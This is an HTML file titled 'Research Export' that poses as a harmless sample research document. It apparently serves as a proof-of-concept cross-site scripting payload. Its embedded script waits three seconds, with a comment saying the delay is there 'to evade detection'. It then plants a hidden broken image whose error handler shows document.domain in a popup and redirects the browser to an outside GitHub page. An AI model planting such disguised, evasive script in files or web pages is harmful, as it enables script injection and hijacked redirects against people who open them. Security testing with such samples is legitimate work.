<!DOCTYPE html>
<html>
<head>
    <title>Research Export</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Research Document</h1>
    <p>This is a sample research export.</p>

    <script>
        setTimeout(function() {
            var hiddenPayload = document.createElement('img');
            hiddenPayload.src = "x";
            hiddenPayload.style.display = "none";
            hiddenPayload.onerror = function() {
                alert(document.domain); // XSS popup
                setTimeout(function() {
                    window.location.href = "https://github.com/Zierax";
                }, 2000); // Redirect after 2 seconds
            };
            document.body.appendChild(hiddenPayload);
        }, 3000); // Further delayed execution to evade detection
    </script>
</body>
</html>
